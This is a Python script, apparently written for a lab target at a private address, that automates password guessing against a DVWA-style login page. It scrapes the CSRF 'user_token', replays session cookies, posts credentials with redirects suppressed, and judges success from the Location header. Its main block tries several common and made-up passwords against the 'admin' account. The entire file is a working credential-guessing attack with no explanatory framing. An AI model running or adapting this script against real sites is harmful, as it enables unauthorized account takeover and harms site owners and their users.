import sys, urllib.request, urllib.parse, re

BASE = "http://10.31.0.87:3000"


def try_login(user, pw):
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    op = urllib.request.build_opener(NoRedirect)
    pg = op.open(BASE + "/login.php", timeout=15)
    setcookie = pg.headers.get_all("Set-Cookie") or []
    body = pg.read().decode()
    tok = re.search(r"user_token' value='([0-9a-f]+)'", body).group(1)
    cookies = []
    seen = set()
    for c in setcookie:
        k, v = c.split(";")[0].split("=", 1)
        seen.discard(k)
        cookies.append((k, v))
    ck = "; ".join("%s=%s" % kv for kv in cookies)
    data = urllib.parse.urlencode({"username": user, "password": pw, "Login": "Login", "user_token": tok}).encode()
    req = urllib.request.Request(BASE + "/login.php", data=data, method="POST")
    req.add_header("Cookie", ck)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        r = op.open(req, timeout=15)
        _status = getattr(r, "status", None)
        loc = "(no redirect)"
    except urllib.error.HTTPError as exc:
        _status = getattr(exc, "code", None)
        loc = exc.headers.get("Location")
    result = "LOGIN_SUCCESS" if (loc and "login.php" not in str(loc)) else "fail"
    sys.stdout.write("%s / %s => status=%s loc=%s [%s]\n" % (user, pw, _status, loc, result))
    return result, ck


if __name__ == "__main__":
    for pw in ["password", "captchapwn1", "pwned1", "admin", "abc123"]:
        try_login("admin", pw)
